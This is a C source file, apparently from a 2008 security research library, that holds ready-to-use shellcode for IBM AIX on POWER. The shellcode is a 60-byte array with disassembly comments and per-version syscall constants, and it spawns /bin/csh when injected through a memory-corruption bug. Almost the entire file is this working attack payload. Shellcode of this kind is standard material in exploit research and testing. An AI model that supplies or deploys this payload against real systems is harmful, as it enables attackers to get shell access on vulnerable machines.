/*
 *  aix-power-shellcode.c
 *  Copyright 2008 Ramon de Carvalho Valle <ramon@risesecurity.org>
 *
 *  This library is free software; you can redistribute it and/or
 *  modify it under the terms of the GNU Lesser General Public
 *  License as published by the Free Software Foundation; either
 *  version 2.1 of the License, or (at your option) any later version.
 *
 *  This library is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
 *  Lesser General Public License for more details.
 *
 *  You should have received a copy of the GNU Lesser General Public
 *  License along with this library; if not, write to the Free Software
 *  Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301  USA
 *
 */

/*
 * Supported AIX versions:
 *
 * -DAIX614     AIX Version 6.1.4
 * -DAIX613     AIX Version 6.1.3
 * -DAIX612     AIX Version 6.1.2
 * -DAIX611     AIX Version 6.1.1
 * -DAIX5310    AIX Version 5.3.10
 * -DAIX539     AIX Version 5.3.9
 * -DAIX538     AIX Version 5.3.8
 * -DAIX537     AIX Version 5.3.7
 *
 */

char shellcode[]=           /*  60 bytes                          */
    "\x3b\xa0\x07\xff"      /*  lil     r29,2047                  */
    "\x7c\xa5\x2a\x79"      /*  xor.    r5,r5,r5                  */
    "\x40\x82\xff\xf9"      /*  bnel    <shellcode>               */
    "\x7f\xc8\x02\xa6"      /*  mflr    r30                       */
    "\x3b\xde\x01\xff"      /*  cal     r30,511(r30)              */
    "\x38\x7e\xfe\x29"      /*  cal     r3,-471(r30)              */
    "\x98\xbe\xfe\x31"      /*  stb     r5,-463(r30)              */
    "\x94\xa1\xff\xfc"      /*  stu     r5,-4(r1)                 */
    "\x94\x61\xff\xfc"      /*  stu     r3,-4(r1)                 */
    "\x7c\x24\x0b\x78"      /*  mr      r4,r1                     */
#ifdef AIX614
    "\x38\x5d\xf8\x08"      /*  cal     r2,-2040(r29)             */
#endif
#ifdef AIX613
    "\x38\x5d\xf8\x08"      /*  cal     r2,-2040(r29)             */
#endif
#ifdef AIX612
    "\x38\x5d\xf8\x08"      /*  cal     r2,-2040(r29)             */
#endif
#ifdef AIX611
    "\x38\x5d\xf8\x08"      /*  cal     r2,-2040(r29)             */
#endif
#ifdef AIX610
    "\x38\x5d\xf8\x07"      /*  cal     r2,-2041(r29)             */
#endif
#ifdef AIX5310
    "\x38\x5d\xf8\x07"      /*  cal     r2,-2041(r29)             */
#endif
#ifdef AIX539
    "\x38\x5d\xf8\x07"      /*  cal     r2,-2041(r29)             */
#endif
#ifdef AIX538
    "\x38\x5d\xf8\x07"      /*  cal     r2,-2041(r29)             */
#endif
#ifdef AIX537
    "\x38\x5d\xf8\x07"      /*  cal     r2,-2041(r29)             */
#endif

    "\x4c\xc6\x33\x42"      /*  crorc   6,6,6                     */
    "\x44\xff\xff\x02"      /*  svca    0                         */
    "/bin/csh"
;

